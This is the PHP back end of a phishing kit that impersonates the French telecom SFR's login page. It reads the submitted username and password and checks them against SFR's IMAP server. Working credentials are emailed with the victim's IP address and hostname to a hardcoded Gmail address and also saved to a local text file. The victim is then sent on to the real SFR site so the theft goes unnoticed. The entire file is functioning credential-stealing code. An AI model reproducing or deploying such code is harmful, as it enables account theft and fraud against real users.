<?php
session_start();
$reciever_email="majid@gmail.com";

$e = $_POST['username'];
$p = $_POST['password'];

	$x = imap_open("{imap.sfr.fr:993/ssl/novalidate-cert}",$e,$p);
	if($x){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message = "--------------------- Email Informations ------------------------\n";
$message.= "| Lgin     : " . $e . "\r\n";
$message.= "| Pass     : " . $p . "\r\n";
$message.= "+ -------------------------------------------------------------\r\n";
$message.= "| ADIP     : " . $ip . "\r\n";
$message.= "| HOST     : " . $hostname . "\r\n";
$message.= "+ -------------------------------------------------------------\r\n";
$headerss='From: noreply@mobile-SFR.com \r\n';
$headerss.='X-Mailer: PHP/' . phpversion().'\r\n';
$headerss.= 'MIME-Version: 1.0' . "\r\n";
$subject = "SFR - Valid " . $e . "@" . $_SERVER['REMOTE_ADDR'];
$mail_to = $reciever_email;
@mail($reciever_email,$subject, $message, $headerss);
$file = fopen("sfr-ok-EMAIL.txt","a");
fwrite($file,$message);
fclose($file);

echo '<script language="Javascript">
document.location.replace("https://www.sfr.fr/");
</script>';


	}else{
	     echo '<script language="Javascript">
document.location.replace("index.php?err=PortailAS/sfr?_nfpb=true&_windowLabel=connexioncompte_2&connexioncompte_2_actionOverride=%2Fportlets%2Fconnexioncompte%2Fvalidationconnexioncompte&_pageLabel=as_login_page&lenght=1&error=yes");
</script>';
	}









